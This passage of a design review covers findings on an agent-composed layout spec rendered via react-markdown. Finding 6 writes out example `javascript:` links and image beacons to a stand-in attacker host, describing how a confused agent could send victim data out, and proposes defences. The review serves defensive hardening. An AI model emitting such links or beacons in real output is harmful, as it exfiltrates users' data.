6. **[Med] The injection-safety argument for `markdown` is sound but under-verified on one axis: link/image protocols.** Confirmed: no `rehype-raw`, no `dangerouslySetInnerHTML` in the codebase, so react-markdown won't render raw HTML — the core claim holds and is genuinely as safe as the SVG-as-`<img>` precedent for *markup*. But react-markdown *does* render markdown links and images by default (`[x](javascript:...)`, `![](http://attacker/track.gif)`). The design never addresses `javascript:`/`data:` URI links or off-origin image beacons in the `markdown`/`list` fields — a confused agent emitting `![](https://attacker.example/$victim_data)` is a real exfil-via-image-beacon vector, and `[click](javascript:...)` depends on react-markdown's default urlTransform. **Fix:** confirm react-markdown's version ships the default `urlTransform` (it sanitizes `javascript:` since v9) and pin it; explicitly disallow images in the markdown render (a `disallowedElements={['img']}` or a urlTransform that drops non-https), and add a validator test asserting a `javascript:`/`data:` link and an off-origin image are neutralized. Don't leave this to "MarkdownContent is safe" — verify the exact config.

7. **[Med] The 4,000-char string cap × 24 blocks × nested arrays can exceed the 48 KB JSON cap — caps are not mutually consistent.** Rule 2 caps total bytes at 48 KB; rule 6 allows single strings ≤ 4,000 chars with up to 24 blocks, each `kv_table` holding 20 rows × (label 200 + value 4,000). That's ~84 KB in one block alone — the per-field caps can describe a spec that the byte cap rejects. Not a security hole (byte cap wins), but it means the validator's *order* matters: a spec that's fine per-field but over-bytes gets a hard reject, losing the whole layout, when soft-degrade (truncate) might be intended. **Fix:** reconcile the caps (lower per-string to make the worst case fit under 48 KB, or apply the byte cap *after* clamping so over-byte degrades gracefully rather than hard-rejecting). Document which cap is authoritative.

8. **[Med] `cleaned["spec"]` / `cleaned["dropped"]` return shape contradicts the validator's stated signature.** §3.1 declares `validate_layout_spec(spec) -> tuple[dict | None, str | None]` returning `(cleaned_spec, None)`. But the tool body (§5.1) reads `cleaned["spec"]` and `cleaned["dropped"]` — i.e. it expects `cleaned` to be a wrapper dict `{"spec": ..., "dropped": [...]}`, not the cleaned spec itself. The two sections disagree on the contract. **Fix:** pick one — either return `(wrapper_dict, err)` where `wrapper_dict = {"spec":..., "dropped":[...]}`, or return `(cleaned_spec, dropped_list, err)`. The tests must assert the exact tuple shape so the tool and validator can't drift.

9. **[Med] `stat_cards` / `kv_table` `value` is "plain text (escaped)" but the example passes an int — type coercion is unspecified.** §2.2 says `stat_cards.cards[].value` is `string | number` and `kv_table` value is "plain text (escaped)." The renderer maps these to React text nodes (safe), but the validator's "string length cap ≤ 4,000" (rule 6) implicitly assumes strings — an int `value:42` has no length. Minor, but the validator must explicitly allow `int|float|str` for `value` and stringify-then-cap, or it'll either crash on `len(42)` or wrongly reject. **Fix:** specify numeric values are coerced to string before the length check; test with `value:42` and `value:"x"*5000`.

10. **[Low] `icon` whitelist is a regex, not a closed set — minor deviation from the "closed registry" framing.** §3.1 rule 6 validates `icon` as `^[a-z0-9_]{1,32}$`, i.e. *any* matching string, not an enumerated set. This is safe (Material Symbols renders unknown names as nothing/a fallback glyph, no injection), but it's the one place the design says "closed" while actually being "pattern-bounded." Not a vulnerability — just name it accurately in the security section so the "everything is a closed enum" claim isn't overstated. **Fix:** reword §3.4/§11 to "icon is pattern-bounded (safe charset, length-capped), all other style tokens are closed-enum."

11. **[Low] Skill `description` front-matter is ~110 words — far longer than the trigger budget and will dilute retrieval.** §8.1's `description` is a dense paragraph. Trigger descriptions should be a tight WHEN-to-load signal; this one embeds the entire registry, the security model, and the tool call. It mirrors `svg_attack_chain.md`'s structure but at 3-4× the length. Long descriptions degrade skill-selection precision. **Fix:** cut the description to one trigger sentence ("LOAD WHEN tailoring an Issue/Case Overview layout to the investigation — after fields + indicators exist"); move the registry/security/templates into the skill *body* where §8.2 already plans them.

12. **[Low] Missing from the build sequence: the `dropped[]` round-trip has no test asserting the agent can actually self-correct, and there's no observability event.** §5 promises `dropped[]` lets the agent "self-correct on a later pass," but the build sequence (§10) tests only "stored shape + dropped[]," not the correction loop. Separately, every other investigation write emits — the design never mentions an observability event for layout composition, yet CLAUDE.md §6.4 / documentation-discipline rule 4 treats silent telemetry as rot. **Fix:** add an observability event (`investigation.layout_composed` with block count + dropped count) so the operator can see when/why the agent composed a layout; add a test that feeds a partially-bad spec, confirms `dropped[]`, then a corrected spec, confirms clean store.

**Overall verdict: REVISE.** The architecture (data-only spec, closed switch, validator-at-write + defense-at-render, additive storage, static fallback) is genuinely sound and faithfully reuses the SVG-sandbox precedent — the injection model is the strongest part and is *almost* airtight (close the markdown link/image gap in #6 and it is). But three High findings are blocking: the reset path is a verified no-op (#1), the case half is mis-scoped as "free" when the case page has no host structure (#2), and the `field` enum silently violates the tab-identity non-goal (#3). Descope to issues-only, fix the null-clear path, constrain the `field` enum to Overview fields, and reconcile the validator contract/caps — then it's ship-ready.